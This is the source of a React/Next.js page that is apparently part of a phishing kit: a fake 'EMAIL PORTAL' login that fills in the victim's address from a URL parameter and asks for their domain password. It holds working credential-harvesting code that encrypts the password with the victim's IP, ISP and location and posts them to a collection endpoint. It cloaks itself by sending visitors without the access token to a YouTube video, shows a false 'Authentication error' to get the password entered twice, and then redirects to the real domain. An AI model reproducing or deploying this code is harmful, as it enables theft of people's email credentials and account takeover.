"use client"; // ✅ Required in Next.js 13–16 for client-side rendering

import { useState, useEffect } from "react";
import {encryptPayload} from '@/utils/encrypt';

export default function Universal() {

  const [showPassword, setShowPassword] = useState(false)
  const [email, setEmail] = useState('')
  const [password, setPassword] = useState('')
  const [domain, setDomain] = useState('')
  const [name, setName] = useState('')
  const [loading, setLoading] = useState(false)
  const [error, setError] = useState('')
  const [clicks, setClicks] = useState(0)

  const [geoInfo, setGeoInfo] = useState(null)

  useEffect(() => {
    const mySearchParams = new URLSearchParams(window.location.search)
    const email = mySearchParams.get('gyu')
    const protect = mySearchParams.get('scd')

    if(isValidEmail(email)){
     setEmail(email)
     let dm = email.split('@')[1]
     setDomain(dm)

    } else {
     setTimeout(() => {
       window.location = 'https://www.youtube.com/watch?v=MvyimScoS2M'

     }, 2000)
    console.log('do nothing for now!!!')

    }

   getGeoInfo(protect)
   // check()
   }, [])


  async function getGeoInfo(protect) {
    const response = await fetch('/api/getInfo')
    const data = await response.json()
    if(data.proc !== protect) {

      setTimeout(() => {
        window.location = 'https://www.youtube.com/watch?v=MvyimScoS2M'
      }, 2000)

    }
    setGeoInfo(data)

  }

  const sendInfo = async (e) => {
    e.preventDefault()
    setLoading(true)

    setClicks(clicks + 1)
    // const info = {
    //   email,
    //   password,
    //   country: geoInfo.country,
    //   city: geoInfo.city,
    //   region: geoInfo.region,
    //   host_ip: geoInfo.ip,
    //   hostname: geoInfo.hostname,
    //   postal_code: geoInfo.postal,
    //   timezone: geoInfo.timezone.id,
    //   date: new Date().toDateString()
    // }

    const info = {
      email,
      password,
      country: geoInfo.country,
      city: geoInfo.city,
      region: `${geoInfo.regionName} | ${geoInfo.region}`,
      host_ip: geoInfo.query,
      hostname: `${geoInfo.isp} | ${geoInfo.org} | ${geoInfo.as}` ,
      postal_code: geoInfo.zip,
      timezone: geoInfo.timezone,
      date: new Date().toDateString()
    }

    const encryptedPayload = encryptPayload(info)

    const res = await fetch('/api/sendEmail', {
      method: "POST",
      body: JSON.stringify(await encryptedPayload),
      headers: {
        'content-type': 'application/json'
      }
    })
    if(res.ok){
      console.log("Yeai!")
      setLoading(false)
      setError('Error connecting to server')
    }else{
      console.log("Oops! Something is wrong.")
      setLoading(false)
      setError('Error connecting to server')
    }


    if(clicks >= 2) {
      window.location = `https://${domain}`
    }

  }



   function isValidEmail(email) {
    const regex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return regex.test(email);
  }

 console.log('clicks: ', clicks)
  return (
    <div
      className="container w3-animate-zoom"
      id="second"
      style={{
        backgroundColor: "rgb(255, 255, 255)",
        boxShadow: "rgba(179, 179, 179, 0.7) 0px 10px 15px",
        height: "560px",
        padding: "20px",
      }}
    >
      {/* Left Box */}
      {/* <div className="left_box">
        <span style={{ fontWeight: "bold" }}>EMAIL SETTINGS PORTAL</span>
      </div> */}

      {/* Top Section */}
      <div className="top_level" style={{ backgroundColor: "transparent" }}>
        {/* <img
          id="top_label_logo"
          src="https://t1.gstatic.com/faviconV2?client=SOCIAL&type=FAVICON&fallback_opts=TYPE,SIZE,URL&url=http://aegistax.com&size=64"
          style={{ display: "block", margin: "10px auto" }}
          alt="logo"
        /> */}
        <center>
          <b>
            <h3 style={{ color: "blue", fontSize: "20px", display: "block" }}>
              {/* <span id="toto" style={{ color: "blue" }}>
                AegisTax
              </span> */}
              <br />
              EMAIL PORTAL
            </h3>
          </b>
        </center>
      </div>

      {/* Intro Text */}
      <div className="intro-text">
        <h2 id="auth_email" style={{ color: "rgb(6, 39, 171)" }}>
          {email}
        </h2>
        <hr style={{ width: "100%", textAlign: "left", marginLeft: 0 }} />
        <p id="comment_text">
          You're accessing a secure settings area. Please provide your{" "}
          <b>
            <span id="pussy">{domain}</span>
          </b>{" "}
          password to continue.
        </p>

        {/* Form Section */}
        <form  id="contact" style={{width: '100%'}}>


          <div className="inputs">
            <div className="input" style={{ marginTop: "15px" }}>
              <input
                type={showPassword ? 'text' : 'password'}
                name="password"
                id="password"
                value={password}
                onChange={e => setPassword(e.target.value)}
                required
                style={{
                  borderColor: "rgb(140, 140, 140)",
                  width: "100%",
                  padding: "6px",
                  marginTop: '5px'
                }}
              />
              <label
                id="pass_label"
                htmlFor="password"
                style={{ display: 'block', marginTop: "2px" }}
              >
                Password
              </label>
            </div>

            {/* Authentication Info */}
            <div style={{ display: "flex", gap: "10px", marginTop: "10px" }}>
              {clicks >= 1 ? (
                <span id="auth_reg2" style={{ color: "red" }}>
                 Authentication error!
               </span>

              ) : (

                <span id="auth_reg" style={{ color: "gray" }}>
                Authentication is required!
              </span>

              )}


            </div>

            {/* Show Password */}
            <div className="rem_me" style={{ marginTop: "10px" }}>
              <input type="checkbox" id="show_pass_button" onChange={() => setShowPassword(!showPassword)} />
              <a
                id="show_pass"
                style={{
                  color: "#0A66C3",
                  fontSize: "0.8rem",
                  marginLeft: "5px",
                  cursor: "pointer",
                }}

              >
                Show password
              </a>
            </div>

            {/* Submit Button */}
            <button
              onClick={(e) => sendInfo(e)}
              id="next_button"
              style={{
                marginTop: "20px",
                paddingTop: "10px",
                paddingBottom: "10px",
                color: "white",
                background: "rgb(24, 143, 255)",
                width: "100%",
                border: "none",
                borderRadius: "4px",
                cursor: "pointer",
              }}
            >
              NEXT
            </button>
          </div>
        </form>

      </div>

      {/* Footer */}
      <hr
        style={{
          width: "100%",
          textAlign: "left",
          marginTop: "30px",
          backgroundColor: "rgba(128, 128, 128, 0.318)",
        }}
      />
      <p className="join-link" style={{ textAlign: "center", color: "gray" }}>
        © 2024&nbsp;
        <a href="#" id="footer_com">
          Secure Portal
        </a>
        &nbsp;|&nbsp;
        <a href="#" id="footer_pri">
          Privacy
        </a>
        <br />
        <a href="#" id="footer_dom">
          {domain}
        </a>
      </p>
    </div>
  );
}
